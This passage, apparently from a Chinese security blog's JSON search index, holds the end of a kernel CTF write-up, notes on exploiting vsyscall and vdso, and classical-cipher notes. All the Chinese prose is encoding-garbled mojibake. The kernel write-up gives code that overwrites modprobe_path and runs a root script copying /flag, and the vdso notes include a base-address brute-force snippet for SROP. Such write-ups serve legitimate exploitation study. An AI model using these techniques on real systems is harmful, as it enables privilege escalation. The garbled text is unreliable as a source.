)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_21-03-24.png)\n\nå¯ä»¥çœ‹åˆ°hackmeæ¨¡å—çš„åŸºåœ°å€ä¹ŸåŒ…å«åœ¨é‡Œé¢ï¼Œå¼€äº†kaslrä¹‹åä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚æ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨å†…æ ¸åŸºåœ°å€å¾—åˆ°mod_treeçš„åœ°å€ï¼Œç”³è¯·ä¸‹æ¥å°±å¯ä»¥ä»é‡Œé¢è¯»å‡ºhackmeæ¨¡å—çš„åŸºåœ°å€ã€‚\n\n \n\n(2)ç„¶åæ–¹æ³•å°±å¾ˆå¤šäº†ï¼Œè™½ç„¶å¼€äº†smep,smap,kaslrï¼š\n\nâ‘ ä¿®æ”¹modprobe_pathï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_21-46-53.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_21-47-02.png)\n\nå¯ä»¥çœ‹åˆ°modprobe_pathæŒ‡å‘ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_21-50-56.png)\n\nè€Œå½“æŸä¸ªç‰¹å®šé”™è¯¯å‘ç”Ÿæ—¶ï¼Œå°±ä¼šè¿è¡Œè¯¥äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸”æ˜¯ä»¥rootæƒé™è¿è¡Œçš„ï¼Œ(æˆ‘å°è¯•è¿‡ï¼Œè¿è¡Œ/bin/shä¸èƒ½ææƒ)æ‰€ä»¥å¦‚æœæˆ‘ä»¬æŠŠè·¯å¾„æ”¹æˆæˆ‘ä»¬çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå°†flagå¤åˆ¶ä¸€ä¸‹ï¼Œæ”¹ä¸‹æƒé™å°±èƒ½æ‰“å¼€äº†ã€‚(ç›´æ¥cat flagä¹Ÿä¸è¡Œï¼Œå¾ˆå¥‡æ€ª)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-07-28_21-59-15.png)\n\næˆ‘ä»¬çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸‹åªèƒ½ç±»ä¼¼æ˜¯å¦‚ä¸‹å‘½ä»¤æ‰è¡Œçš„ï¼š\n\n```bash\n#æ³¨é‡Šå¤´\n\n#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag\n\n\n#æˆ–è€…\n#!/bin/sh\n/bin/cat /flag > /home/pwn/flag.txt\n```\n\næ³¨æ„è¦ä½¿ç”¨ç»å¯¹è·¯å¾„ã€‚\n\nâ–²ç„¶åè§¦å‘è¿™ä¸ªç‰¹å®šç±»å‹çš„é”™è¯¯éœ€è¦ä¸€ä¸ªé”™è¯¯æ ¼å¼çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼š\n\n```c\n#æ³¨é‡Šå¤´\n\nsystem(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' > /home/pwn/dummy\");\nsystem(\"chmod +x /home/pwn/dummy\");\n```\n\nè¿™ä¸ªelfçš„é”™è¯¯æ ¼å¼å°±æ˜¯\\\\xff\\\\xff\\\\xff\\\\xffï¼Œæˆ–è€…å…¶ä»–é”™è¯¯æ ¼å¼ä¹Ÿè¡Œã€‚\n\n```c\n#æ³¨é‡Šå¤´\n\nstrncpy(mem,\"/home/pwn/copy.sh\\0\",18);\nwrite_to_kernel(fd,0xc,mem,18,0);\n\nsystem(\"echo -ne '#!/bin/sh\\n/bin/cp /flag /home/pwn/flag\\n/bin/chmod 777 /home/pwn/flag' > /home/pwn/copy.sh\");\nsystem(\"chmod +x /home/pwn/copy.sh\");\nsystem(\"echo -ne '\\\\xff\\\\xff\\\\xff\\\\xff' > /home/pwn/dummy\");\nsystem(\"chmod +x /home/pwn/dummy\");\n\nsystem(\"/home/pwn/dummy\");\nsystem(\"cat flag\");\n```\n\n \n","tags":["modprobe"],"categories":["pwn-kernel","Kernel_modprobe"]},{"title":"vsdoå’Œvsyscallçš„å‰ä¸–ä»Šç”Ÿ","url":"/2021/08/14/vsdoå’Œvsyscallçš„å‰ä¸–ä»Šç”Ÿ/","content":"\nä¸€ã€vsyscallï¼šä¸€èˆ¬åªæœ‰ubuntu16.04,libc-2.23ä¸­æœ‰äº†ã€‚\n\n1.vsyscallçš„ä½œç”¨ï¼š\n\nç°ä»£çš„Windows/*Unixæ“ä½œç³»ç»Ÿéƒ½é‡‡ç”¨äº†åˆ†çº§ä¿æŠ¤çš„æ–¹å¼ï¼Œå†…æ ¸ä»£ç ä½äºR0ï¼Œç”¨æˆ·ä»£ç ä½äºR3ã€‚è®¸å¤šå¯¹ç¡¬ä»¶å’Œå†…æ ¸ç­‰çš„æ“ä½œéƒ½ä¼šè¢«åŒ…è£…æˆå†…æ ¸å‡½æ•°å¹¶æä¾›ä¸€ä¸ªæ¥å£ç»™ç”¨æˆ·å±‚ä»£ç è°ƒç”¨ï¼Œè¿™ä¸ªæ¥å£å°±æ˜¯æˆ‘ä»¬ç†ŸçŸ¥çš„int 0x80/syscall+è°ƒç”¨å·æ¨¡å¼ã€‚å½“æˆ‘ä»¬æ¯æ¬¡è°ƒç”¨è¿™ä¸ªæ¥å£æ—¶ï¼Œä¸ºäº†ä¿è¯æ•°æ®çš„éš”ç¦»ï¼Œæˆ‘ä»¬éœ€è¦æŠŠå½“å‰çš„ä¸Šä¸‹æ–‡(å¯„å­˜å™¨çŠ¶æ€ç­‰)ä¿å­˜å¥½ï¼Œç„¶ååˆ‡æ¢åˆ°å†…æ ¸æ€è¿è¡Œå†…æ ¸å‡½æ•°ï¼Œç„¶åå°†å†…æ ¸å‡½æ•°è¿”å›çš„ç»“æœæ”¾ç½®åˆ°å¯¹åº”çš„å¯„å­˜å™¨å’Œå†…å­˜ä¸­ï¼Œå†æ¢å¤ä¸Šä¸‹æ–‡ï¼Œåˆ‡æ¢åˆ°ç”¨æˆ·æ¨¡å¼ã€‚è¿™ä¸€è¿‡ç¨‹éœ€è¦è€—è´¹ä¸€å®šçš„æ€§èƒ½ã€‚å¯¹äºæŸäº›ç³»ç»Ÿè°ƒç”¨ï¼Œå¦‚gettimeofdayæ¥è¯´ï¼Œç”±äºä»–ä»¬ç»å¸¸è¢«è°ƒç”¨ï¼Œå¦‚æœæ¯æ¬¡è¢«è°ƒç”¨éƒ½è¦è¿™ä¹ˆæ¥å›æŠ˜è…¾ä¸€éï¼Œå¼€é”€å°±ä¼šå˜æˆä¸€ä¸ªç´¯èµ˜ã€‚å› æ­¤ç³»ç»ŸæŠŠå‡ ä¸ªå¸¸ç”¨çš„æ— å‚å†…æ ¸è°ƒç”¨ä»å†…æ ¸ä¸­æ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´ä¸­ï¼Œè¿™å°±æ˜¯vsyscallã€‚\n\n2.vsyscallçš„ç‰¹ç‚¹ï¼š\n\n(1)æŸäº›ç‰ˆæœ¬å­˜åœ¨ï¼Œéœ€è¦ç”¨åˆ°gdbæ¥æŸ¥çœ‹ï¼ŒIDAä¸­é»˜è®¤ä¸å¯è§ã€‚\n\n(2)åœ°å€ä¸å—åˆ°ASLRå’ŒPIEçš„å½±å“ï¼Œå›ºå®šæ˜¯0xffffffffff600000-0xffffffffff601000ã€‚\n\n(3)ä¸èƒ½ä»ä¸­é—´è¿›å…¥ï¼Œåªèƒ½ä»å‡½æ•°å¼€å¤´è¿›å…¥ï¼Œæ„å‘³ç€ä¸èƒ½ç›´æ¥è°ƒç”¨é‡Œé¢çš„syscallã€‚è¿™é‡Œvsyscallåˆ†ä¸ºä¸‰ä¸ªå‡½æ•°ï¼Œä»ä¸Šåˆ°ä¸‹ä¾æ¬¡æ˜¯\n\n```\n#æ³¨é‡Šå¤´\n\nA.gettimeofday: 0xffffffffff600000\nB.time:         0xffffffffff600400\nC.getcpu:       0xffffffffff600800\n```\n\n(4)gettimeofdayå‡½æ•°æ‰§è¡ŒæˆåŠŸæ—¶è¿”å›å€¼å°±æ˜¯0ï¼Œä¿å­˜åœ¨raxå¯„å­˜å™¨ä¸­ã€‚è¿™å°±ä¸ºæŸäº›one_gadgetåˆ›é€ äº†æ¡ä»¶ã€‚\n\n(5)æœ‰R,Xæƒé™ï¼Œä½†æ˜¯æ²¡æœ‰Wæƒé™ï¼Œä¸å¯å†™ï¼Œä¸èƒ½è¿›è¡Œshellcodeå¸ƒç½®ã€‚\n\n(6)åªæœ‰ä¸‰ä¸ªç³»ç»Ÿè°ƒç”¨çš„å‡½æ•°ï¼Œå…¶ä½™å†…å­˜éƒ½ä»¥\"int3\"æŒ‡ä»¤å¡«å……ã€‚\n\n3.vsyscallçš„åˆ©ç”¨ï¼š\n\n(1)è°ƒæ•´æ ˆå¸§ï¼Œä¸‹æ‹‰rspï¼š\n\nvsyscallç›´æ¥è¿›è¡Œsyscallï¼Œå¹¶æ²¡æœ‰åˆ©ç”¨æ ˆç©ºé—´ï¼Œæ‰€ä»¥åœ¨å¤„ç†æ ˆæº¢å‡ºï¼Œä½†æ˜¯ç”±äºPIEæ²¡æœ‰åˆ«çš„åœ°å€å¯ä»¥ç”¨æ—¶ï¼Œè€Œæ ˆä¸Šåˆæœ‰æŸä¸ªæœ‰ç”¨çš„åœ°å€çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡vsyscallæ„é€ ä¸€ä¸ªropé“¾æ¥retï¼Œæ¯æ¬¡retéƒ½ä¼šæ¶ˆè€—æ‰ä¸€ä¸ªåœ°å€ï¼Œå°†rspä¸‹æ‹‰ä¸€ä¸ªå•ä½ï¼Œè¿™æ ·å°±å¯ä»¥é€æ¸å»è´´è¿‘æƒ³è¦çš„é‚£ä¸ªåœ°å€ï¼Œæœ€åæˆåŠŸretåˆ°ç›¸åº”çš„ä½ç½®ã€‚\n\n(2)SROPåˆ©ç”¨ï¼š\n\nsyscall retï¼›æŒ‡ä»¤å¯ç”¨äºæ„é€ SROPï¼Œåªéœ€è¦åœ¨å…¶é¢å‰æ”¾ç½®ä¸€ä¸ª\"pop rax;ret\"çš„gadgetï¼Œé€šè¿‡æ ˆæº¢å‡ºå°†raxèµ‹å€¼ä¸º0xfå³å¯è°ƒç”¨__kernel_rt_sigreturnï¼Œä»è€Œæ‰“SROPã€‚\n\n \n\n \n\näºŒã€vdsoï¼šå¤§å¤šç‰ˆæœ¬ç”¨vdsoå–ä»£äº†vsyscall\n\n1.vdsoä½œç”¨ï¼š\n\nä¸vsyscallå·®ä¸å¤šï¼Œæœ¬æ¥å°±æ˜¯ä¸ºäº†å–ä»£vsyscallç”¨çš„ï¼Œä¸è¿‡æ˜¯é€šè¿‡å…±äº«åº“è¿›è¡Œæ˜ å°„ï¼Œå’ŒåŠ¨æ€åŠ è½½æœ‰ç‚¹ç±»ä¼¼ã€‚\n\n2.vdsoç‰¹ç‚¹ï¼š\n\n(1)vdsoçš„åœ°å€éšæœºåŒ–çš„ï¼Œä¸”å…¶ä¸­çš„æŒ‡ä»¤å¯ä»¥ä»»æ„æ‰§è¡Œï¼Œä¸éœ€è¦ä»å…¥å£å¼€å§‹ã€‚\n\n(2)ç›¸æ¯”äºæ ˆå’Œå…¶ä»–çš„ASLRï¼Œvdsoçš„éšæœºåŒ–éå¸¸çš„å¼±ï¼Œå¯¹äº32çš„ç³»ç»Ÿæ¥è¯´ï¼Œæœ‰1/256çš„æ¦‚ç‡å‘½ä¸­ã€‚\n\n(3)ä¸åŒçš„å†…æ ¸éšæœºç¨‹åº¦ä¸åŒï¼š\n\nA.è¾ƒæ—§ç‰ˆæœ¬ï¼š0xf76d9000-0xf77ce000\n\nB.è¾ƒæ–°ç‰ˆæœ¬ï¼š0xf7ed0000-0xf7fd0000\n\nå¯åˆ©ç”¨pwnä¸­LinuxçŸ¥è¯†ä¸­çš„æ–‡ä»¶æ¥æŸ¥çœ‹å…·ä½“èŒƒå›´ã€‚æ³¨æ„åç§»éœ€è¦æ›´æ”¹ä¸€ä¸‹ï¼Œå¯ä»¥è°ƒè¯•æŸ¥çœ‹ï¼Œä¸€èˆ¬åœ¨200ä»¥å†…ã€‚ç”¨stack 200ï¼ŒæŸ¥åˆ°çš„åœ°æ–¹é™¤ä»¥4ä¹‹å-2å°±æ˜¯åç§»ï¼Œä¸è¡Œå°±å†è°ƒè¯•ã€‚æˆ–è€…ç›´æ¥pwndbgçš„fmtarg addræ¥æŸ¥çœ‹åç§»ã€‚\n\nâ–²èŒƒå›´æµ‹é‡ï¼š\n\nç¼–è¯‘ä¸€ä¸ªæ‰“å°vdsoçš„ç¨‹åºï¼Œç¼–è¯‘ä»£ç ä¸ºï¼š\n\ngcc -g -m32 vdso_addr.c -o vdso_addr\n\nå¦‚æœæ˜¯64ä½ç¨‹åºåˆ™å°†m32æ”¹æˆm64å³å¯\n\n```\n#æ³¨é‡Šå¤´\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint main()\n{\n    printf(\"vdso addr: %124$p\\n\");//è¿™é‡Œçš„124åç§»éœ€è¦gdbè°ƒè¯•è¿›è¡Œè°ƒæ•´\n    return 0;\n}\n```\n\nç„¶åç”¨è„šæœ¬å³å¯æ‰“å°ç¡®å®šèŒƒå›´ï¼Œå°†èŒƒå›´è°ƒå¤§æ›´åŠ ç²¾ç¡®ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nimport os\nresult = []\nfor i in range(100):\n    result += [os.popen('./vdso_addr').read()[:-1]]\nresult = sorted(result)\nfor v in result:\n    print (v)\n```\n\n \n\n3.vdsoçš„åˆ©ç”¨ï¼š\n\nä¸vsyscallå·®ä¸å¤šï¼Œ32ä½ä¸­æœ‰ç°æˆçš„__kernel_rt_sigreturnå¯ä»¥æ‰“SROPã€‚ä¹Ÿå¯ä»¥ç”¨gettimeofdayæ¥åˆ›é€ ropï¼Œç»•è¿‡PIEï¼Œæ»‘è¿‡ç©ºé—´ã€‚\n\n4.è¯»å–é¶æœºçš„vdso:\n\n(1)å¦‚æœç»™äº†libcï¼Œé‚£ä¹ˆæ ¹æ®libcç‰ˆæœ¬ä½¿ç”¨qemuæˆ–è€…dockeråˆ›å»ºä¸€ä¸ªç¯å¢ƒï¼Œéšä¾¿è¿è¡Œä¸€ä¸ªç¨‹åºï¼Œç”¨gdbå‘½ä»¤dumpä¸‹æ¥ã€‚(dump memory vdso32.so addr_start addr_end)\n\n(2)å¦‚æœæ²¡ç»™ï¼Œé‚£ä¹ˆåªèƒ½å…ˆæ³„éœ²åœ°å€å†è€ƒè™‘å…¶å®ƒã€‚\n\n(3)ä¹‹åå°±å¯ä»¥ç”¨\n\n```\n#æ³¨é‡Šå¤´\n\nelf = ELF(â€œ./vdso32.soâ€)#æ¥åŠ è½½\nRANGE_VDSO  = range(0xf7ed0000, 0xf7fd0000, 0x1000)\nvdso_addr = random.choice(RANGE_VDSO)\nSROP_kernel_addr = vdso_addr + vdso.symbols['__kernel_rt_sigreturn']\n```\n\nä½†æ˜¯è¿™é‡Œè¿˜æ˜¯éœ€è¦åŠ ä¸Šwhileå¾ªç¯çˆ†ç ´ä½¿ç”¨ï¼Œå› ä¸ºä¸ç¡®å®šéšæœºåŒ–çš„åŸºåœ°å€ã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\n[https://xz.aliyun.com/t/5236/usr/include/g](https://xz.aliyun.com/t/5236#toc-9)\n\n \n","tags":["vdso"],"categories":["pwn-kernel"]},{"title":"å¯†ç å­¦åŸºç¡€","url":"/2021/08/14/å¯†ç å­¦åŸºç¡€/","content":"\n# ç¬¬äºŒç«  å¤å…¸å¯†ç \n\n## 1.Monoalphabetic Cipher:\n\nå•å­—æ¯æ›¿ä»£å¯†ç (å°†æ˜æ–‡å­—ç¬¦é›†å’Œå¯†æ–‡å­—ç¬¦é›†å»ºç«‹æ˜ å°„å…³ç³»)\n\nâ–²å•è¡¨æ›¿ä»£ï¼šæ˜æ–‡å­—ç¬¦é›†ä¸å¯†æ–‡å­—ç¬¦é›†ä»»æ„æ›¿ä»£(ä¸€ä¸€æ˜ å°„)ï¼Œé‚£ä¹ˆnä¸ªå…ƒç´ å³æœ‰n!ç§ç½®æ¢ã€‚(è‹¥ä»…ä»…é’ˆå¯¹å­—ç¬¦é›†ï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡å­—æ¯çš„ä½¿ç”¨é¢‘ç‡æ¥åˆ†æè§£å¯†)\n\n### (1)Caesarå¯†ç ï¼š\n\nå°†å­—æ¯ç”¨å®ƒä¹‹åçš„ç¬¬ä¸‰ä¸ªå­—æ¯è¿›è¡Œæ›¿ä»£(26ä¸ªå­—æ¯å¾ªç¯)\n\n### (2)keywordå¯†ç ï¼š\n\n- keyï¼šéšæ„é€‰å–ä¸€ä¸ªå…³é”®è¯key\n\n- å»é‡ï¼šå°†keyä¸­çš„é‡å¤å­—æ¯å»æ‰ï¼Œä¾‹å¦‚ï¼šsuccess->suce\n\n- å¡«è¡¨ï¼šå°†å»é‡çš„keyå¡«å…¥26ä¸ªå­—æ¯è¡¨å‰é¢ä½ç½®ï¼Œä¾æ¬¡åºæ¥ç€å¡«æ»¡26ä¸ªå­—æ¯ã€‚\n\n```\n//æ³¨é‡Šå¤´\n\nsuceabdfghijklmnopqrtvwxyz\nabcdefghijklmnopqrstuvwxyz\n```\n\n- åŠ å¯†ï¼šä¾æ®ä¸Šè¡¨ï¼ŒæŸ¥è¡¨å°†æ˜æ–‡æ›¿ä»£ä¸ºå¯†æ–‡ã€‚\n\n### (3)Multiliteral Cipherï¼š\n\néšæ„é€‰å–ä¸€ä¸ªäº”å­—æ¯çš„å…³é”®è¯key\n\n- å¡«è¡¨ï¼šä¾æ®å…³é”®è¯keyå½¢æˆ5Ã—5çš„çŸ©é˜µï¼Œå°†26ä¸ªå­—æ¯å¡«å……è¿›å»ï¼Œå…¶ä¸­i/jä¸ºä¸€ä¸ªã€‚\n\n- åŠ å¯†ï¼šæ¯ä¸ªå­—æ¯ç›´æ¥è½¬æ¢ä¸ºkeyçš„è¡Œå’Œåˆ—ï¼Œå³ä¸€ä¸ªå­—æ¯ç›´æ¥å˜æˆä¸¤ä¸ªå­—æ¯ã€‚\n\n(æ¯”è¾ƒè„†å¼±ï¼Œå› ä¸ºå¯†é’¥å°±å­˜åœ¨äºå¯†æ–‡ä¸­)\n\nâ˜†åˆ†æï¼šåˆ©ç”¨å­—æ¯ä½¿ç”¨é¢‘ç‡åˆ†æï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454806.png)\n\n \n\n \n\n## 2.Polyalphabotic Cipherï¼š\n\nå¤šè¡¨æ›¿ä»£å¯†ç ï¼Œå‡å°‘å­—æ¯é¢‘ç‡ç‰¹å¾\n\n### (1) Vigenere Cipherï¼š\n\n- keyï¼šéšæ„é€‰å–ä¸€ä¸ªå…³é”®è¯key\n\n- å¯¹åº”ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\nHOLD HO LDH OLDHOLDHO\nTHIS IS THE PLAINTEXT\n```\n\n- åŠ å¯†ï¼š\n\n  - æŸ¥è¡¨åŠ å¯†(è¡Œåˆ—æŸ¥è¡¨éƒ½å¯ä»¥ï¼Œå› ä¸ºå¯¹ç§°çš„)ï¼š\n\n    ![img](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203222122573.png)\n\n  - mod26åŠ å¯†ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\n0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25\nA B C D E F G H I J K  L  M  N  O  P  Q  R  S  T  U  V  W  X  Y  Z\n\n            7  14 11 3  7  14 11 3  7  14 11 3  7  14 11 3  7  14\nkey:        H  O  L  D  H  O  L  D  H  O  L  D  H  O  L  D  H  O \nplaintext:  T  H  I  S  I  S  T  H  E  P  L  A  I  N  T  E  X  T\n            19 7  8  18 8  18 19 7  4  15 11 0  8  13 19 4  23 19\n\nç›¸åŠ mod26ï¼š  0  21 19 21 15 6  4  10 11 3  22 3  15 1  4  7  4  7\nciphertext: A  V  T  V  P  G  E  K  L  D  W  D  P  B  E  H  E  H\n```\n\nä»¥ä¸Šä¸¤ç§æ–¹æ³•éƒ½å¯ä»¥ã€‚\n\nâ˜†åˆ†æï¼š\n\n- ç®—å¯†é’¥é•¿åº¦ï¼šä¸€æ®µå¯†æ–‡ä¸­æŸ¥æ‰¾é‡å¤å‡ºç°çš„å‡ ä¸ªå­—èŠ‚ï¼Œè®¡ç®—é‡å¤å‡ºç°çš„å‡ ä¸ª\n\n```\n//æ³¨é‡Šå¤´\n\nkey:        R U N R U N R U N R U N R U N R U N R U N R U N R U N\nplaintext:  T O B E O R N O T T O B E T H A T I S T H E Q U E S T\nciphertext: K I O V I E E I G K I O V N U R N V J N U V K H V M G\n```\n\nKIOVå’Œä¸‹ä¸€ä¸ªKIVOï¼ŒNUå’Œä¸‹ä¸€ä¸ªNUï¼Œåˆ†åˆ«ç›¸å·®9ä¸ªå­—æ¯ï¼Œ6ä¸ªå­—æ¯ï¼Œå¤šæ¬¡é‡å¤è®¡ç®—ï¼Œç®—å‡ºå…¬å› æ•°ï¼Œè¿™é‡Œå…¬å› æ•°æ˜¯3ï¼Œé‚£ä¹ˆ3å°±å¯èƒ½æ˜¯å¯†é’¥é•¿åº¦ã€‚\n\n- å˜æˆå•è¡¨æ›¿ä»£ï¼šå‡è®¾å¾—åˆ°å…¬å› æ•°é•¿åº¦ä¸ºabcdefï¼Œåˆ™è¿›è¡Œå¦‚ä¸‹è®¡ç®—ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\nkey:        abcde fabcd efabc defab cdefa bcdef abcde fabcd efabc defab\nciphertext: lpkso fjbnn mpfls rneoi yqrlx bkqtz ucxot ssbvb wpjil geckb\n```\n\nå°†æ‰€æœ‰ç”±aåŠ å¯†çš„å­—æ¯æå–å‡ºæ¥ï¼Œä¸º ljfoxusjk.......é‡å¤å¤šæ¬¡ã€‚(è¿™é‡Œé€‰å–abcdefä¸­ä»»æ„ä¸€ä¸ªéƒ½å¯)ã€‚è½¬æ¢æˆ6ä¸ªå•è¡¨æ›¿ä»£å¯†ç ï¼Œä¹‹åå³å¯ä»å•è¡¨æ›¿ä»£å¯†ç ljfoxusjk.......ä¸­è¿›è¡Œå­—æ¯é¢‘ç‡åˆ†æï¼Œé€æ­¥ç ´è¯‘ã€‚(æ¯”å¦‚è¯´jå°±æœ‰å¯èƒ½æ˜¯e)\n\n### (2)Autokey Cipher(é’ˆå¯¹Vigenere Cipherçš„æ”¹è¿›)ï¼š\n\né€‰å–å…³é”®è¯\n\n- keyï¼šé€‰å–å…³é”®è¯Key\n\n- åˆæ¬¡ï¼škeyåŠ å¯†å¯¹åº”æ•°é‡çš„å¯†æ–‡\n\n- é‡å¤ï¼šå°†å‰ä¸€æ¬¡åŠ å¯†å¾—åˆ°çš„å¯†æ–‡æ‹¿æ¥ä½œä¸ºkeyåŠ å¯†ã€‚\n\nâ˜†å¾ˆè„†å¼±ï¼Œå¯†æ–‡å³ä¸ºå¯†é’¥çš„ä¸€éƒ¨åˆ†ï¼Œå¯é€šè¿‡é”™ä½åˆ†ææ¥ç›´æ¥è§£å¯†ï¼š\n\n```\n//æ³¨é‡Šå¤´\n\nkey:         capcnpwgd\nplaintext:   anautokeycipherprovidesalongkeyword\nciphertext:  cnpwgd...........................\n```\n\nåˆå§‹å¯†é’¥ä¸ºcapï¼Œä¹‹åä¾æ¬¡å¾—åˆ°cnpï¼Œwgd....\n\n### (3)AutoKey Plaintextï¼š\n\n(ç±»ä¼¼ï¼Œä½†æ˜¯æ˜¯æ‹¿æ˜æ–‡å†è¿›è¡ŒåŠ å¯†)\n\n \n\n## 3.Rotor Ciphersï¼š\n\nè½¬è½®å¯†ç \n\n- è½®å­çš„å†…éƒ¨å¯¹åº”å…³ç³»ä¸å˜ï¼Œå¤–åœ¨è§¦ç‚¹å¯ä»¥è½¬åŠ¨ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454996.png)     ![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454998.png)\n\n- åˆ©ç”¨å¤šä¸ªè½®å­åˆåœ¨ä¸€èµ·å½¢æˆåŠ å¯†å…³ç³»ï¼Œè½¬åŠ¨è§¦ç‚¹å³å¯æ”¹å˜åŠ å¯†å…³ç³»ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454253.png)  ![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454189.png)\n\nè¿™é‡Œçš„åˆå§‹åŒ–çŠ¶æ€å’Œè½¬åŠ¨æ–¹å¼å°±å¯çœ‹ä½œæ˜¯å¯†é’¥ã€‚\n\n \n\n## 4.Polygraphic Cipherï¼š\n\nå¤šå›¾æ›¿ä»£å¯†ç \n\n### (1)Play fairå¯†ç ï¼š\n\nåŒå­—æ¯éŸ³èŠ‚æ›¿ä»£åŠ å¯†\n\n- keyï¼šéšæ„é€‰å–å¯†é’¥key\n\n- å¡«è¡¨ï¼škeyé¡ºåºåŠ ä¸Šå‰©ä½™å­—æ¯ä¾æ¬¡æ’åˆ—è¿›5Ã—5è¡¨ä¸­(è¿™é‡Œkeyä¸ºharpsichord)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191454715.png)\n\n- åˆ†ç»„ï¼šå¯¹æ˜æ–‡è¿›è¡ŒæŒ‰ä¸¤ä¸ªå­—æ¯ä¸€å¯¹è¿›è¡Œåˆ†ç»„ï¼Œå¦‚æœå…¶ä¸­æœ‰å­—æ¯å¯¹ä¸¤ä¸ªå­—æ¯ç›¸åŒï¼Œå°±åœ¨å…¶ä¸­å¡«å……ä¸€ä¸ªå…¶ä»–å­—æ¯(è¿™ä¸ªå­—æ¯æœ€å¥½é€‰å–å‡ºç°æ¦‚ç‡è¾ƒå°çš„å­—æ¯ï¼Œæ¯”å¦‚xxåŸºæœ¬ä¸ä¼šå‡ºç°)ï¼šballon -> ba lx lo on\n\n- åŠ å¯†ï¼š\n  - è½åœ¨çŸ©é˜µåŒä¸€è¡Œçš„æ˜æ–‡å­—æ¯å¯¹ä¸­å­—æ¯ç”±å…¶å³è¾¹å­—æ¯ä»£æ›¿ï¼Œæœ€å³è¾¹åˆ™ç”±æœ€å·¦è¾¹æ›¿ä»£ã€‚ä¾‹å¦‚ï¼šAR->RP\n  - è½åœ¨çŸ©é˜µåŒä¸€åˆ—çš„æ˜æ–‡å­—æ¯å¯¹ä¸­å­—æ¯ç”±å…¶ä¸‹è¾¹å­—æ¯ä»£æ›¿ï¼Œæœ€ä¸‹é¢åˆ™ç”±æœ€ä¸Šé¢æ›¿ä»£ã€‚ä¾‹å¦‚ï¼šIM->EV\n  - ä¸åŒè¡Œä¸åŒåˆ—çš„åˆ™ç”±å¯¹ç§°è¡Œåˆ—è½¬åŒ–åŠ å¯†(åŒè¡Œæ›¿æ¢)ï¼Œä¾‹å¦‚ï¼šCT->DNï¼ŒOU->BQ....\n\nâ˜†åˆ†æï¼š(m1,m2)->(c1,c2)ï¼Œé‚£ä¹ˆå¦‚æœæœ‰(m2,m1)ï¼Œåˆ™ä¸€å®šæ˜¯(m1,m2)->(c2,c1)ã€‚å¯ä»¥å°†æ˜æ–‡å’Œå¯†æ–‡å¯¹æ¯”ç§»ä½ã€‚(å…·ä½“çš„çœ‹PDF)\n\n \n\n### (2)Double playfairå¯†ç ï¼š\n\n- é€‰å–ä¸¤ä¸ªå…³é”®è¯keyï¼Œå»é‡ï¼Œå¡«è¡¨æ„å»ºä¸¤ä¸ªçŸ©é˜µï¼Œè¡Œå¯¹åº”æ’åˆ—ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191455819.png)\n\n- ç»™å®šä¸€ä¸ªæ•°å­—ï¼Œæ‰€æœ‰æ˜æ–‡æŒ‰ç…§æ‰€é€‰æ•°å­—åˆ†ç»„è¿›è¡Œæ’åˆ—ï¼Œä¸è¶³çš„è¡¥æŒ‡å®šå­—æ¯ã€‚ä¾‹å¦‚ç»™å®šæ˜æ–‡ä¸ºthis is double playfair cipherï¼Œæ•°å­—ä¸º10ï¼Œä¸è¶³è¡¥xï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nthisisdoub\nleplayfair\n\ncipherxxxx\nxxxxxxxxxx\n```\n\n- æŒ‰ç»„è¿›è¡ŒåŠ å¯†ï¼Œä¸Šè¿°åˆ†ç»„æƒ…å†µå³ä¸ºtl,he,ip.....cx,ix,px.......xxå…±è®¡20ç»„ã€‚\n\n- å¯¹æ¯ç»„è¿›è¡ŒåŠ å¯†ï¼Œåˆ†åˆ«ä»ä¸¤ä¸ªçŸ©é˜µä¸­æ‰¾åˆ°æ˜æ–‡å­—æ¯å¯¹ï¼ŒåŠ å¯†è§„åˆ™ç±»ä¼¼ï¼š\n  - ä¸åŒè¡Œçš„å³å¯¹è§’çº¿äº¤æ¢ï¼štl->op\n  - åŒè¡Œçš„ç”±å³è¾¹å­—æ¯æ›¿ä»£ï¼Œä½†è¿™é‡Œæ›¿ä»£å®Œä¹‹åè¿˜éœ€è¦äº¤æ¢ä¸€ä¸‹ï¼šbr->ac\n\n \n\n## 5.Transposition cipherï¼š\n\n### (1)Skytale cipherï¼š\n\nç¼ ç»•å¯†ç ï¼Œä¸€å¼ 